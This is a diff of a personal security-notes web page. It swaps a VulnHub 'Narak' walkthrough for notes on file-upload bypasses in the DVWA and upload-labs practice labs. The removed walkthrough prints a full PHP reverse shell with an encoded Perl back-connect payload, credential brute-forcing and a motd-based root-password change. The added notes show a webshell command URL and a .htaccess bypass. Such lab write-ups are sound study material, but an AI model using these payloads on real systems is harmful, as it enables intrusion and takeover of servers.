@@ -9,17 +9,17 @@
       
       
       
-        <link rel="prev" href="../msf%E6%8A%93%E5%8C%85/">
+        <link rel="prev" href="../vulhub_Lame/">
       
       
-        <link rel="next" href="../rsync%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">
+        <link rel="next" href="../%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.14">
     
     
       
-        <title>Narak - 陈奕霖</title>
+        <title>文件上传原理及绕过 - 陈奕霖</title>
       
     
     
@@ -67,7 +67,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#_1" class="md-skip">
+        <a href="#dvwalow" class="md-skip">
           跳转至
         </a>
       
@@ -102,7 +102,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Narak
+              文件上传原理及绕过
             
           </span>
         </div>
@@ -785,62 +785,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Narak
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../narak/" class="md-nav__link">
         Narak
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    一、信息搜集：
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    二、漏洞利用与探测：
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    三、提权
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -906,11 +855,158 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          文件上传原理及绕过
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         文件上传原理及绕过
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#dvwalow" class="md-nav__link">
+    DVWA文件上传Low级
+  </a>
+  
+    <nav class="md-nav" aria-label="DVWA文件上传Low级">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    1）上传文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    2）找一个图片进行实验：（发包中途改包，进行阶段）
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#upload" class="md-nav__link">
+    upload文件上传
+  </a>
+  
+    <nav class="md-nav" aria-label="upload文件上传">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pass1" class="md-nav__link">
+    pass1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass2" class="md-nav__link">
+    pass2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass3" class="md-nav__link">
+    pass3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass4" class="md-nav__link">
+    pass4
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass5" class="md-nav__link">
+    pass5
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass6" class="md-nav__link">
+    pass6
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass7" class="md-nav__link">
+    pass7
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass8" class="md-nav__link">
+    pass8
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass9" class="md-nav__link">
+    pass9
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass10" class="md-nav__link">
+    pass10
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pikachu" class="md-nav__link">
+    pikachu文件上传
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -961,22 +1057,118 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    一、信息搜集：
+  <a href="#dvwalow" class="md-nav__link">
+    DVWA文件上传Low级
   </a>
+  
+    <nav class="md-nav" aria-label="DVWA文件上传Low级">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    1）上传文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    2）找一个图片进行实验：（发包中途改包，进行阶段）
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    二、漏洞利用与探测：
+  <a href="#upload" class="md-nav__link">
+    upload文件上传
   </a>
+  
+    <nav class="md-nav" aria-label="upload文件上传">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pass1" class="md-nav__link">
+    pass1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass2" class="md-nav__link">
+    pass2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass3" class="md-nav__link">
+    pass3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass4" class="md-nav__link">
+    pass4
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass5" class="md-nav__link">
+    pass5
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass6" class="md-nav__link">
+    pass6
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass7" class="md-nav__link">
+    pass7
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass8" class="md-nav__link">
+    pass8
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass9" class="md-nav__link">
+    pass9
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass10" class="md-nav__link">
+    pass10
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    三、提权
+  <a href="#pikachu" class="md-nav__link">
+    pikachu文件上传
   </a>
   
 </li>
@@ -996,228 +1188,117 @@
                   
 
 
-  <h1>Narak</h1>
+  <h1>文件上传原理及绕过</h1>
 
-<p>靶机网址：<a href="https://www.vulnhub.com/entry/ha-narak,569/">HA: Narak ~ VulnHub</a></p>
-<hr />
-<h2 id="_1"><strong>一、信息搜集：</strong></h2>
-<ol>
-<li><strong>获取IP：</strong></li>
-</ol>
-<p><strong>nmap -sP 192.168.8.0/24</strong>  </p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609325.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<ol>
-<li><strong>端口扫描：</strong></li>
-</ol>
-<p><strong>nmap -sV -p- -sC 192.168.8.132 -n -vv</strong></p>
-<p><strong>22、80端口均开启</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609714.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<ol>
-<li><strong>访问192.168.8.132</strong></li>
-</ol>
-<p><strong>从页面搜索信息</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212610480.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212608986.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>·</strong></p>
-<p><strong>翻译了一下网页内容信息提取关键字或许有用： yamdoot,swarm,narak</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609185.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<ol>
-<li><strong>目录扫描：</strong></li>
-</ol>
-<p><strong>gobuster dir -q -u *<em>http://192.168.8.132*</em> -w /usr/share/seclists/Discovery/Web-Content/common.txt</strong></p>
-<p><strong>注意到/webdav</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609227.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>访问该目录</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421261084.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>用上边关键字随便输入尝试登录也没用</strong></p>
-<ol>
-<li><strong>尝试爆破获取密码</strong></li>
-</ol>
-<p><strong>先爬取密码文件</strong></p>
-<p><strong>cewl 192.168.8.132 -w passwd1.txt</strong> </p>
-<p><strong>再用hydra爆破以下</strong></p>
-<p><strong>账号密码：yamdoot, Swarg</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609396.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>再尝试登陆下：</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260972.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<ol>
-<li><strong>无可用信息，查看下源代码：</strong></li>
-</ol>
-<p><strong>意思是服务器无法验证我是否有权访问该文档，或者密码或者证书的问题</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260953.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<ol>
-<li><strong>查找关于webdav的漏洞文章</strong></li>
-</ol>
-<p><strong>用Metasploits模块检查是否启用了webdav</strong></p>
-<p><strong>使用 ：auxiliary/scanner/http/webdav_scanner</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609709.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>设置参数：</strong></p>
-<p><strong>将路径改为 /dav,这是webdav常用目录</strong></p>
-<p><strong>设置目标IP地址</strong></p>
-<p><strong>run启动模块</strong></p>
-<p><strong>扫描结果：</strong></p>
-<p><strong>http信息，包括apache版本，是否启用webdav</strong></p>
-<p><strong>显然结果是没开启，所以这条路行不通</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609542.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<ol>
-<li><strong>再搜索关于webdav（可以上传文件）:</strong></li>
-</ol>
-<p><strong>WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 *<em><a href="https://baike.baidu.com/item/HTTP">HTTP</a>*<em> 1.1协议的*</em><a href="https://baike.baidu.com/item/通信协议/3351624">通信协议</a>*<em>。它*</em><a href="https://baike.baidu.com/item/扩展/2732987">扩展</a>*<em>了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使*</em><a href="https://baike.baidu.com/item/应用程序/5985445">应用程序</a>*<em>可对*</em><a href="https://baike.baidu.com/item/Web Server/9306055">Web Server</a>*<em>直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的*</em><a href="https://baike.baidu.com/item/版本控制/3311252">版本控制</a>*</em></strong></p>
-<p><strong>所以进一步可以实行上传一个反链接脚本</strong></p>
-<h2 id="_2"><strong>二、漏洞利用与探测：</strong></h2>
-<ol>
-<li><strong>查找到cadaver可以对webdav进行读写</strong></li>
-</ol>
-<p><strong>上传一个php的反链脚本</strong></p>
-<p><strong>代码如下（更改IP和端口）：</strong></p>
-<div class="highlight"><pre><span></span><code>&lt;?php
-
-function which($pr) {
-
-$path = execute(&quot;which $pr&quot;);
-
-return ($path ? $path : $pr);
-
-}
-
-function execute($cfe) {
-
-$res = &#39;&#39;;
-
-if ($cfe) {
-
-if(function_exists(&#39;exec&#39;)) {
-
-@exec($cfe,$res);
-
-$res = join(&quot;\n&quot;,$res);
-
-} elseif(function_exists(&#39;shell_exec&#39;)) {
-
-$res = @shell_exec($cfe);
-
-} elseif(function_exists(&#39;system&#39;)) {
-
-@ob_start();
-
-@system($cfe);
-
-$res = @ob_get_contents();
-
-@ob_end_clean();
-
-} elseif(function_exists(&#39;passthru&#39;)) {
-
-@ob_start();
-
-@passthru($cfe);
-
-$res = @ob_get_contents();
-
-@ob_end_clean();
-
-} elseif(@is_resource($f = @popen($cfe,&quot;r&quot;))) {
-
-$res = &#39;&#39;;
-
-while(!@feof($f)) {
-
-$res .= @fread($f,1024);
-
-}
-
-@pclose($f);
-
-}
-
-}
-
-return $res;
-
-}
-
-function cf($fname,$text){
-
-if($fp=@fopen($fname,&#39;w&#39;)) {
-
-@fputs($fp,@base64_decode($text));
-
-@fclose($fp);
-
-}
-
-}
-
-$yourip = &quot;your IP&quot;;
-
-$yourport = &#39;your port&#39;;
-
-$usedb = array(&#39;perl&#39;=&gt;&#39;perl&#39;,&#39;c&#39;=&gt;&#39;c&#39;);
-
-$back_connect=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.
-
-&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.
-
-&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.
-
-&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.
-
-&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.
-
-&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.
-
-&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;
-
-cf(&#39;/tmp/.bc&#39;,$back_connect);
-
-$res = execute(which(&#39;perl&#39;).&quot; /tmp/.bc $yourip $yourport &amp;&quot;);
-
-?&gt;
-</code></pre></div>
-<p><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" /></p>
-<ol>
-<li><strong>上传shell</strong></li>
-</ol>
-<p><strong>cadaver *<em>http://192.168.8.132/webdav*</em></strong></p>
-<p><strong>username：yamdoot</strong></p>
-<p><strong>password:Swarg</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609217.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>再kali另一个终端开启监听，网页访问192.168.8.132/webdav</strong></p>
-<p><strong>已上传</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260970.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>再去访问shell.php</strong></p>
-<ol>
-<li><strong>建立交互式shell</strong></li>
-</ol>
-<p><strong>kali监听到结果：</strong></p>
-<p><strong>python3 -c 'import pty;pty.spawn("/bin/bash")'</strong></p>
-<p><strong>当前权限不是最高权限，还需要进一步提权</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609546.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>搜索信息</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609150.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260950.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>搜索到一串字符，搜索下Brainfuck可解码</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609880.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260956.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p>​        <strong>得到明文密码：chitragupt</strong></p>
-<p><strong>猜想用户名应该是 inferno narak 中一个</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/2021080421260921.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<h2 id="_3"><strong>三、提权</strong></h2>
-<ol>
-<li><strong>先尝试inferno登录l连接ssh</strong></li>
-</ol>
-<p><strong>连接成功</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609455.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<p><strong>搜集信息</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609218.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
-<ol>
-<li><strong>利用了motd，通过修改ssh登陆时的欢迎信息对root密码进行修改：</strong></li>
-</ol>
-<p><strong>echo "echo 'root:inferno'|sudo chpasswd" &gt;&gt; /etc/update-motd.d/00-header</strong></p>
-<p><strong>退出后重新用inferno登录</strong></p>
-<p><strong>su -root</strong></p>
-<p><strong>成功获取root权限：</strong></p>
-<p><strong><em>*<img alt="img" src="../narak.assets/20210804212609398.png" /><img alt="点击并拖拽以移动" src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" />编辑*</em></strong></p>
+<p>文件上传目标：上传一个可执行的应用目标程序</p>
+<p>寻找文件上传的点：头像、文章、前端论坛，上传zip文件、后台管理员文件上传</p>
+<p>突破上传</p>
+<p>拿到服务器权限</p>
+<p>-------------------------------------------------------------------------------</p>
+<h3 id="dvwalow">DVWA文件上传Low级</h3>
+<h4 id="1">1）上传文件</h4>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps1.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps2.jpg" /> </p>
+<p>将连接复制进去，页面跳转</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps3.png" /><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps4.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps5.jpg" /> </p>
+<p>将此文件更改</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps6.jpg" /> </p>
+<p>上传，访问页面：</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps7.jpg" /> </p>
+<p>查看抓包文件</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps8.jpg" /> </p>
+<p>将文件发送到repeater,更改红框内上传的文件：</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps9.jpg" /> </p>
+<p>Send之后显示上传成功：</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps10.jpg" /> </p>
+<p>刷新网页之后访问成功：</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps11.jpg" /> </p>
+<h4 id="2">2）找一个图片进行实验：（发包中途改包，进行阶段）</h4>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps12.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps13.jpg" /> </p>
+<p>2.medium</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps14.jpg" /> </p>
+<p>只允许上传JPEG，png格式文件，对要上传文件和正确文件上传抓包对比</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps15.jpg" /> </p>
+<p>通过代码查看，审查content-type，所以将他更改即可</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps16.jpg" /> </p>
+<p>成功上传</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps17.jpg" /> </p>
+<p>3）high级别：</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps18.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps19.jpg" /> </p>
+<p>将复制的haha.jpg上传</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps20.jpg" /> </p>
+<h3 id="upload">upload文件上传</h3>
+<h4 id="pass1">pass1</h4>
+<p>打开js上传</p>
+<p>复制图片地址访问:</p>
+<p>http://192.168.56.1/upload/upload/one.php?cmd=system(‘whoami’);</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps21.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps22.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps23.jpg" /> </p>
+<h4 id="pass2">pass2</h4>
+<p>截断，在发送包之前更改content-type：amige/jpeg</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps24.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps25.jpg" /> </p>
+<h4 id="pass3">pass3</h4>
+<p>后缀绕过，更改后缀名</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps26.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps27.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps28.jpg" /> </p>
+<h4 id="pass4">pass4</h4>
+<p>.htaccess绕过</p>
+<p>提示拒绝以下后缀名文件上传，但是唯独  .htaccess可以</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps29.jpg" /> </p>
+<p>所以上传一个.htaccess文件内容为：SetHandler application/x-httpd-php</p>
+<p>文件都可以被解析为php,</p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps30.jpg" /> </p>
+<p><img alt="img" src="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87.assets/wps31.jpg" /> </p>
